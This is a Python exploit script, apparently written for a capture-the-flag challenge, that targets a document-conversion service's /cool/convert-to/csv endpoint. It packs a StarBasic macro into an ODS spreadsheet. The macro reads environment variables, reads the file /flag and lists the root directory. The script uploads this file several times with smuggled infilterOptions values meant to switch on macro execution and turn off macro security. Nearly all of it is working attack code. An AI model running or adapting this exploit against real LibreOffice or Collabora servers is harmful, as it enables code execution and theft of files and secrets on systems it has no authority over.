#!/usr/bin/env python3
"""Temporary CTF Calc Basic-formula probe using a LO-authored ODS skeleton."""
import io
import pathlib
import urllib.error
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
SKELETON = pathlib.Path(__file__).with_name("macro_skeleton.ods")

BASIC = r'''Function ReadLocal(path As String) As String
    Dim i As Integer
    Dim line As String
    Dim result As String
    On Error GoTo Failed
    i = FreeFile
    Open path For Input As #i
    Do While Not EOF(i)
        Line Input #i, line
        result = result & line & Chr(10)
    Loop
    Close #i
    ReadLocal = result
    Exit Function
Failed:
    ReadLocal = "READ_FAILED:" & path
End Function

Function PocFunc() As String
    Dim s As String
    Dim f As String
    s = "MACRO_EXECUTED" & Chr(10)
    s = s & "ENV_FLAG=" & Environ("FLAG") & Chr(10)
    s = s & "ENV_CTF_FLAG=" & Environ("CTF_FLAG") & Chr(10)
    s = s & "FILE_FLAG=" & ReadLocal("/flag") & Chr(10)
    On Error Resume Next
    f = Dir("/", 0)
    Do While f <> ""
        s = s & "ROOT=" & f & Chr(10)
        f = Dir()
    Loop
    PocFunc = s
End Function
'''


def build_ods():
    with zipfile.ZipFile(SKELETON) as src:
        items = [(info, src.read(info.filename)) for info in src.infolist()]
    esc = BASIC.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    module = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
        '<script:module xmlns:script="http://openoffice.org/2000/script" '
        'script:name="Module1" script:language="StarBasic">' + esc + '</script:module>'
    ).encode()
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        for info, data in items:
            if info.filename == "Basic/Standard/Module1.xml":
                data = module
            z.writestr(info, data)
    return out.getvalue()


def send(data, infilter, label):
    boundary = "----Arena" + uuid.uuid4().hex
    parts = []
    if infilter is not None:
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"infilterOptions\"\r\n\r\n{infilter}\r\n".encode())
    parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"macro.ods\"\r\nContent-Type: application/vnd.oasis.opendocument.spreadsheet\r\n\r\n".encode())
    parts.append(data)
    parts.append(f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(BASE + "/cool/convert-to/csv", data=b"".join(parts), method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, "INFILTER", repr(infilter), flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(2000000)
            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def main():
    doc = build_ods()
    print("ODS_BYTES", len(doc), flush=True)
    send(doc, None, "CONTROL")
    send(doc, "EnableMacrosExecution=true,MacroSecurityLevel=0", "ORIGINAL_CHAIN")
    send(doc, "x enableMacrosExecution=true macroSecurityLevel=0", "LOAD_TOKEN_INJECTION")
    send(doc, "x readonly=0 enableMacrosExecution=true macroSecurityLevel=0", "LOAD_TOKEN_INJECTION_WRITABLE")


if __name__ == "__main__":
    main()
